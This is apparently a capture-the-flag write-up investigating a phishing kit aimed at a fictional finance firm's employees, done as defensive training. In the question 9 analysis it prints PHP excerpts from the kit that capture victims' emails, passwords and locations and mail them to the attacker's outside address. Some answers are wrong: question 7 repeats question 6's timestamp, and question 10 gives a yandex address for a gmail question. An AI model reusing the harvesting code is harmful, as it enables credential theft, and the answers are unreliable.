## Snapped Phish-ing Line

### Overview
As an IT department personnel of SwiftSpend Financial, one of your responsibilities is to support your fellow employees with their technical concerns. While everything seemed ordinary and mundane, this gradually changed when several employees from various departments started reporting an unusual email they had received. Unfortunately, some had already submitted their credentials and could no longer log in.

### Task
You now proceeded to investigate what is going on by:
1. Analysing the email samples provided by your colleagues
2. Analysing the phishing URL(s) by browsing it using Firefox
3. Retrieving the phishing kit used by the adversary
4. Using CTI-related tooling to gather more information about the adversary
5. Analysing the phishing kit to gather more information about the adversary

### Question 1 - Who is the individual who received an email attachment containing a PDF?
There are five different phishing email samples. I opened up each one to look at the attachment types. As mentioned in the previous lab, almost all email clients will show the attachment either at the top or bottom of the email. You can always find the attached content by looking at the `Content-Type` and `Content-Disposition` fields in the email source. The email with the PDF is the one titled **Quote for Services Rendered: processed on June 29, 2020, 10:01:32 AM**

<img width="885" height="823" alt="image" src="https://github.com/user-attachments/assets/1604170f-a341-4a11-b059-75110d673edf" />

**Answer**: William McClean

### Question 2 - What email address was used by the adversary to send the phishing emails?
You should be able to see this at the top of your email client. It is the same email for every sample since this is a single campaign.

<img width="885" height="822" alt="image" src="https://github.com/user-attachments/assets/fcff7493-83e2-4a59-9cd8-140a30e0bcfb" />

**Answer**: Accounts.Payable@groupmarketingonline.icu

### Question 3 - What is the redirection URL to the phishing page for the individual Zoe Duncan? (defanged format)
Zoe Duncan's email is the one titled **Group Marketing Online Direct Credit Advice**. If you look at the HTML attachment, you can find the answer. I saved it to the **Downloads** folder and then used `cat` to dump the contents to the command line. It's not a big file so need to `grep` anything.

<img width="879" height="250" alt="image" src="https://github.com/user-attachments/assets/2614c7e0-7f51-425b-be32-aca66db871b6" />

Then we just need to defang it using **CyberChef**. Make sure you select all of the **Defang URL** options (escape dots, escape http, and escape ://)

<img width="884" height="663" alt="image" src="https://github.com/user-attachments/assets/b2fdf2d9-078f-4ddd-9338-e2d6c15db66c" />

**Answer**: hxxp[://]kennaroads[.]buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe[.]duncan@swiftspend[.]finance&error

### Question 4 - What is the URL to the .zip archive of the phishing kit? (defanged format)
We can find this by searching through the URL paths of the phsihing domain. This can be safely done in the VM we have, without risk of infecting our network. I started by looking at the main domain - **hxxp[://]kennaroads[.]buzz**. Nothing really stood out to me there.

<img width="883" height="802" alt="image" src="https://github.com/user-attachments/assets/21d260fb-0db9-4186-acfc-5fc84137edde" />

If we look at the URL again, we can see that there is a **data** path. That sounds promising. If we navigate to **hxxp[://]kennaroads[.]buzz/data**, we see this:

<img width="490" height="278" alt="image" src="https://github.com/user-attachments/assets/f96f56d1-cd8f-4f39-bd27-a8e05ec23df7" />

The zip archive is there! Now we just need to copy and paste the link to that zip archive in CyberChef to defang it and we have our answer.

**Answer**: hxxp[://]kennaroads[.]buzz/data/Update365[.]zip

### Question 5 - What is the SHA256 hash of the phishing kit archive?
Since we're in a controlled and secure environment, we can download the zip archive and check the hash. I used the `sha256sum Update365.zip` command.

<img width="714" height="39" alt="image" src="https://github.com/user-attachments/assets/2df931b6-87e1-4ccb-ad1f-83b6c06cdd20" />

**Answer**: ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686

### Question 6 - When was the phishing kit archive first submitted? (format: YYYY-MM-DD HH:MM:SS UTC)
Not sure about other OSINT tools, but you can find this info easily with VirusTotal. Submit the hash and look at the **History** section under the **Details** tab.

<img width="1603" height="889" alt="image" src="https://github.com/user-attachments/assets/1e49b10c-7969-4741-abb6-f93480ae07eb" />

**Answer**: 2020-04-08 21:55:50 UTC

### Question 7 - When was the SSL certificate the phishing domain used to host the phishing kit archive first logged? (format: YYYY-MM-DD)
Unfortunately, the SSL certificate is no longer available to answer this question, so they give you the answer.

**Answer**: 2020-04-08 21:55:50 UTC

### Question 8 - What was the email address of the user who submitted their password twice?
I wasn't sure on how to find the answer to this riht away. My thought process ended up being that the attacker would have this information, not us. I started looking through the **data** URL path and found a **log.txt** file at **hxxp[://]kennaroads[.]buzz/data/Update365/log[.]txt**. This is where the answer was.

<img width="942" height="803" alt="image" src="https://github.com/user-attachments/assets/ce303572-5a31-49b7-be9c-f9ddb9ae4981" />

**Answer**: michael.ascot@swiftspend.finance

### Question 9 - What was the email address used by the adversary to collect compromised credentials?
First, I thought this was the sender email address, but this is just the email that the adversary used to conduct the phishing campaign. I then searched the email source for any other email address the attacker may have used. There was an email used for a fake opt-out option for the phishing emails, but that was it. I also couldn't find anything in the **data** URL path. There was another email in the **log.txt** file that didn't belong to the victims of our phishing samples, but that is just another victim. Next step is to analyze the phishing kit itself. This would be the **Update365.zip** archive we downloaded earlier.

I unzipped the archive using the following command (from the directory of the zip archive): `unzip Update365.zip`. From there, I was able to navigate into `Update365/office365` and see a whole bunch of stuff.

<img width="596" height="305" alt="image" src="https://github.com/user-attachments/assets/6c26825f-3c7b-448e-a8f1-1865b8ffc443" />

This was a bit overwhelming, and I wasn't sure where to begin looking. All I know is that I needed to fins an email address. Thankfully, there is a very powerful and helpful tool called `grep`. When combined with some regex, this should help us tremendously. I need to search through every file in the `office365` directory, including all of the subdirectories, for email addresses. This means I need to use grep **recursively**. This can be achieved with the `-R` flag.

I'm also using a long and somewhat complex regex pattern to find email addresses: `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`. If I just grep regex normally, it uses **Basic Regular Expressions (BRE)** by default. This is a bit older and harder to work with since some characters are treated as literals, and more things need to be escaped compared to modern regex. By using the `-E` flag, that tells grep to use **Extended Regular Expressions (ERE)**. This is more aligned with modern regex that we're used to.

Finally, I want to tell grep to ignore binary files. Since these are non-textual files, anything in there that matches my pattern would just be due to pure coincidence, and not an actual email. I can use `--binary-files=without-match` for this. This is what the whole command looks like when put together:
```
grep -RE \
> --binary-files=without-match \
> "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" \
> .
```

You could also do it this way: `grep -RE --binary-files=without-match "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" .`. It's a stylistic choice, so whichever you prefer. This is what the results look like:
```
./updat.cmd:	$to ="jamestanner2299@gmail.com"
./updat.cmd:	$to ="jamestanner2299@gmail.com"
./updat.cmd:	$headers = "From: Blessing <blessing@heaven.com>";
./script.st:	$to ="jamestanner2299@gmail.com"
./script.st:	$headers = "From: Blessing <blessing@heaven.com>";
./update/pagesc.koo:	$to ="jamestanner2299@gmail.com"
./update/pagesc.koo:	$to ="jamestanner2299@gmail.com"
./update/pagesc.koo:	$headers = "From: Blessing <blessing@heaven.com>";
./update/cleanup:	$to ="jamestanner2299@gmail.com"
./update/cleanup:	$to ="jamestanner2299@gmail.com"
./update/cleanup:	$headers = "From: Blessing <blessing@heaven.com>";
./update/pagescir:	$to ="jamestanner2299@gmail.com"
./update/pagescir:	$to ="jamestanner2299@gmail.com"
./update/pagescir:	$headers = "From: Blessing <blessing@heaven.com>";
./update/update:	$to ="jamestanner2299@gmail.com"
./update/update:	$to ="jamestanner2299@gmail.com"
./update/update:	$headers = "From: Blessing <blessing@heaven.com>";
./update/viruscle.reg:	$to ="jamestanner2299@gmail.com"
./update/viruscle.reg:	$to ="jamestanner2299@gmail.com"
./update/viruscle.reg:	$headers = "From: Blessing <blessing@heaven.com>";
./Validation/updat.cmd:	$to ="jamestanner2299@gmail.com"
./Validation/updat.cmd:	$to ="jamestanner2299@gmail.com"
./Validation/updat.cmd:	$headers = "From: Blessing <blessing@heaven.com>";
./Validation/script.st:	$to ="jamestanner2299@gmail.com"
./Validation/script.st:	$headers = "From: Blessing <blessing@heaven.com>";
./Validation/update:	$to ="jamestanner2299@gmail.com"
./Validation/update:	$to ="jamestanner2299@gmail.com"
./Validation/update:	$headers = "From: Blessing <blessing@heaven.com>";
./Validation/resubmit.php:$send = "m3npat@yandex.com";
./Validation/resubmit.php:mail("m3npat@yandex.com",$bron,$message,$lagi);
./Validation/submit.php:$send = "m3npat@yandex.com";
./Validation/submit.php:mail("m3npat@yandex.com",$bron,$message,$lagi);
./Scriptup/newscr.pt:	$to ="jamestanner2299@gmail.com"
./Scriptup/newscr.pt:	$headers = "From: Blessing <blessing@heaven.com>";
./Scriptup/updat.cmd:	$to ="jamestanner2299@gmail.com"
./Scriptup/updat.cmd:	$to ="jamestanner2299@gmail.com"
./Scriptup/updat.cmd:	$headers = "From: Blessing <blessing@heaven.com>";
./Scriptup/pagescir:	$to ="jamestanner2299@gmail.com"
./Scriptup/pagescir:	$to ="jamestanner2299@gmail.com"
./Scriptup/pagescir:	$headers = "From: Blessing <blessing@heaven.com>";
./Scriptup/script.st:	$to ="jamestanner2299@gmail.com"
./Scriptup/script.st:	$headers = "From: Blessing <blessing@heaven.com>";
./Scriptup/update:	$to ="jamestanner2299@gmail.com"
./Scriptup/update:	$to ="jamestanner2299@gmail.com"
./Scriptup/update:	$headers = "From: Blessing <blessing@heaven.com>";
./Scriptup/marvid:	$to ="jamestanner2299@gmail.com"
./Scriptup/marvid:	$to ="jamestanner2299@gmail.com"
./Scriptup/marvid:	$headers = "From: Blessing <blessing@heaven.com>";
```

Lots of stuff! But only a couple emails. Now, you can just trial and error these to see which is the answer, but it's important to actually understand "why?" it's the answer. Let's look at the contents of each file, starting with `updat.cmd`

#### updat.cmd
This file appears to be the front page of the phishing kit. It asks the user to select the client they wish to login with to access the attachment. Presumabely each of these lead to a fake login page.
```
<div class="foot-lnk">To access the attached document, Select with email provider below. </div>
...
<input id="tab-2" type="radio" name="tab" class="sign-up"><label for="tab-2" class="tab">Sign Up</label>-->
  <div class="login-form">
    <div class="sign-in-htm">
      <div class="group">
        <div class="btn-3 loginBtn loginBtn--office"><a href="o1">Login with Office 365</a></div>
      </div>
      <div class="group">
        <div class="btn-3 loginBtn loginBtn--outlook"><a href="o4">Login with Outlook</a></div>
      </div>
      <div class="group">
        <div class="btn-3 loginBtn loginBtn--aol"><a href="a2">Login with Aol</a></div>
      </div>
      <div class="group">
    <div class="btn-3 loginBtn loginBtn--yahoo"><a href="y3">Login with Yahoo</a></div>
      </div>
      <div class="group">
        <div class="btn-3 loginBtn loginBtn--other"><a href="o6">Login with Other Mail</a></div>
```

It catches the email and password entered.
```
$message .= "E: " . $_GET['email'] . "\n"; 
$message .= "Ps: " . $_GET['password'] . "\n";
```

It collects the IP address and attempts to geolocate it.
```
//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
$ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
$ip = $_SERVER['REMOTE_ADDR']; 
}
...
$message .= "IP : " .$ip. "\n"; 
$message .= "--------------------------\n";
$message .=     "City: {$geoplugin->city}\n";
$message .=     "Region: {$geoplugin->region}\n";
$message .=     "Country Name: {$geoplugin->countryName}\n";
$message .=     "Country Code: {$geoplugin->countryCode}\n";
```

The exfiltration email that it wants to send data to appears to be `jamestanner2299@gmail.com`
```
$to ="jamestanner2299@gmail.com"
```

However, it doesn't seem like this file would even run. For starters, a signficant portion is commented out (`<!--,-->`).
```
<!--<div class="top"></div>-->
    <!--<input id="tab-1" type="radio" name="tab" class="sign-in" checked><label for="tab-1" class="tab">Sign In</label>
		
    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
	$message .= "---|BLESSINGS|---\n";
    $message .= "Email Provider: Yahoo\n";
    $message .= "E: " . $_GET['email'] . "\n"; 
    $message .= "Ps: " . $_GET['password'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";

	$to ="jamestanner2299@gmail.com"
		<input id="tab-2" type="radio" name="tab" class="sign-up"><label for="tab-2" class="tab">Sign Up</label>-->
```

There also doesn't appear to be any `<?php ?>` tags, which PHP requires to run afaik. Some statements are also missing semicolons (`;`) to complete the line. There's no function or statement to actually send the data to the specified email. For reasons I can't tell, there's also duplicated code blocks, suggesting that this is a very amataeur, and poorly developed phishing kit. At first glance, it might seem that `jamestanner2299@gmail.com` is the right answer, but the file wouldn't actually do anything, so I don't believe that's correct.

#### script.st
This script looks almost the same as the previous one, except no duplicated code. The goal appears to be the same outcome - collect and exfiltrate credentials to a phishing email. Though this script would also not work as it is plagued with many of the same syntax errors as the previous script. Not much more analysis to be done with this one.

#### pagesc.koo
Here is where we start to see a pattern emerge. Yet another file that attempts to do the same thing as the others. This one is even more closely resembling the contents of `updat.cmd`. So now we have three different scripts that appear to attempt the same thing, except in multiple file formats (`.cmd`, `.st`, `.koo`) and in different locations. It almost seems like the adversary was trying and failing to create this over and over again without much care.

#### cleanup
Same thing.

#### pagescir
Same thing.

#### update
Same thing.

...

I think you get the idea. I'll just skip to the part where I find something.

#### resubmit.php
I finally found it. `Update365/office365/Validation` looks like what would actually capture and exfil stolen credentials. This file does a couple different things. Despite the fact that the code is messy to the point of comical, it actually has proper PHP tags!

1. Blocks direct page visits so no one can just visit it:
```
if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}
```

2. Generates a random URL that the target is directed to:
```
function random_number(){
	$numbers = array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key = array_rand($numbers);
	return $numbers[$key];
}

$url = random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
header('location:'.$url);
```

3. Collects the vistims information like country, IP, address, email, password, etc:
```
$country = visitor_country();
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");
$from = $_SERVER['SERVER_NAME'];
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$email = $_POST['email'];
$password = $_POST['password'];
$passchk = strlen($password);
...
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
```

4. Actually send stolen data to the attacker's email:
```
mail("m3npat@yandex.com",$bron,$message,$lagi)
```

It does some other things, but these are the highlights. Especially the email sending part. The attacker uses `mail()`, a built in PHP function to achieve this. The email in question is `m3npat@yandex.com`. With that, we **finally** have our answer!

**Answer**: m3npat@yandex.com

### Question 10 - The adversary used other email addresses in the obtained phishing kit. What is the email address that ends in "@gmail.com"?
Based on our lengthy analysis from the previous question, I think the answer is pretty obvious.

**Answer**: m3npat@yandex.com

### Question 11 - What is the hidden flag?
